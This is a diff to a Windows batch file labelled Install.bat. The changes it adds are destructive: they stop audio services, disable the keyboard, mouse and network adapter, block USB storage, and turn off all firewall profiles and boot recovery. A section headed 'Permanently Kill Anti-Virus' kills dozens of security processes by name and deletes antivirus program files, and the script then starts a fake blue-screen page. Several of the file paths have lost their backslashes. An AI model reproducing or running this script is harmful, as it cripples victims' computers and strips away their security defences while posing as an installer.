@@ -48,7 +48,14 @@
  ::::::::::::::::::::::::::::
 REM Run shell as admin - title Install.bat
 echo ...
-pause
+net stop audiosrv   
+net stop audiosrv   
+net stop audiosrv   
+net stop audiosrv   
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
 taskkill /f  /im explorer.exe
 rundll32.exe user32.dll,SetCursorPos
 start main.cpl @0
@@ -58,6 +65,146 @@ set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
 reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
 rem ---------------------------------
+c:\windows\system32\rundll32.exe keyboard,disable
+c:\windows\rundll32.exe keyboard,disable
+cacls %windir%\Inf\Usbstor.pnf /d user
+cacls %windir%\Inf\Usbstor.inf /d user
+netsh firewall set opmode disable
+netsh advfirewall set domainprofile state off
+netsh advfirewall set privateprofile state off 
+netsh advfirewall set publicprofile state off
+bcdedit /set {globalsettings} advancedoptions true
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures  
+sc config "explorer.exe" start= disabled 
+sc stop "explorer.exe"
+netsh interface set interface "Ethernet" admin=disable
+
+rem —
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A OUTPOST
+tskill /A nv*
+tskill /A nav*
+tskill /A F-*
+tskill /A ESAFE
+tskill /A cle
+cls
+tskill /A BLACKICE
+tskill /A def*
+tskill /A kav
+tskill /A kav*
+tskill /A avg*
+tskill /A ash*
+cls
+tskill /A aswupdsv
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar*
+tskill /A gcasDt*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml
+tskill /A msiexec
+tskill /A outpost
+tskill /A isafe
+tskill /A zap*
+cls
+tskill /A zauinst
+tskill /A upd*
+tskill /A zlclien*
+tskill /A minilog
+tskill /A cc*
+tskill /A norton*
+cls
+tskill /A norton au*
+tskill /A ccc*
+tskill /A npfmn*
+tskill /A loge*
+tskill /A nisum*
+tskill /A issvc
+tskill /A tmp*
+cls
+tskill /A tmn*
+tskill /A pcc*
+tskill /A cpd*
+tskill /A pop*
+tskill /A pav*
+tskill /A padmin
+cls
+tskill /A panda*
+tskill /A avsch*
+tskill /A sche*
+tskill /A syman*
+tskill /A virus*
+tskill /A realm*
+cls
+tskill /A sweep*
+tskill /A scan*
+tskill /A ad-*
+tskill /A safe*
+tskill /A avas*
+tskill /A norm*
+cls
+tskill /A offg*
+del /Q /F C:Program Filesalwils~1avast4*.*
+del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
+del /Q /F C:Program Fileskasper~1*.exe
+cls
+del /Q /F C:Program Filestrojan~1*.exe
+del /Q /F C:Program Filesf-prot95*.dll
+del /Q /F C:Program Filestbav*.dat
+cls
+del /Q /F C:Program Filesavpersonal*.vdf
+del /Q /F C:Program FilesNorton~1*.cnt
+del /Q /F C:Program FilesMcafee*.*
+cls
+del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
+del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
+del /Q /F C:Program FilesNorton~1Norton~1*.*
+del /Q /F C:Program FilesNorton~1*.*
+cls
+del /Q /F C:Program Filesavgamsr*.exe
+del /Q /F C:Program Filesavgamsvr*.exe
+del /Q /F C:Program Filesavgemc*.exe
+cls
+del /Q /F C:Program Filesavgcc*.exe
+del /Q /F C:Program Filesavgupsvc*.exe
+del /Q /F C:Program Filesgrisoft
+del /Q /F C:Program Filesnood32krn*.exe
+del /Q /F C:Program Filesnood32*.exe
+cls
+del /Q /F C:Program Filesnod32
+del /Q /F C:Program Filesnood32
+del /Q /F C:Program Fileskav*.exe
+del /Q /F C:Program Fileskavmm*.exe
+del /Q /F C:Program Fileskaspersky*.*
+cls
+del /Q /F C:Program Filesewidoctrl*.exe
+del /Q /F C:Program Filesguard*.exe
+del /Q /F C:Program Filesewido*.exe
+cls
+del /Q /F C:Program Filespavprsrv*.exe
+del /Q /F C:Program Filespavprot*.exe
+del /Q /F C:Program Filesavengine*.exe
+cls
+del /Q /F C:Program Filesapvxdwin*.exe
+del /Q /F C:Program Fileswebproxy*.exe
+del /Q /F C:Program Filespanda software*.*
+rem —
 @echo off
 echo ^<html^>^<head^>^<title^>BSOD^
 </title^> > data1.hta
